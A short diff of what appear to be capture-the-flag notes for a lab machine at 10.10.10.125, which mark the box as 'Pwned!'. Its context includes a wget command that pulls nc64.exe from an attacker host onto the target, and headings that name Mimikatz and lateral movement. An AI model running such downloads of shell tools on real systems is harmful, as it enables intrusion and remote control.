@@ -1,4 +1,4 @@
-#InProgress 
+#Pwned! 
 ```IP
 10.10.10.125
 ```
@@ -103,4 +103,5 @@ wget http://10.10.14.17/nc64.exe -O nc.exe
 ### Mimikatz
 
 # Lateral Movement
+
 
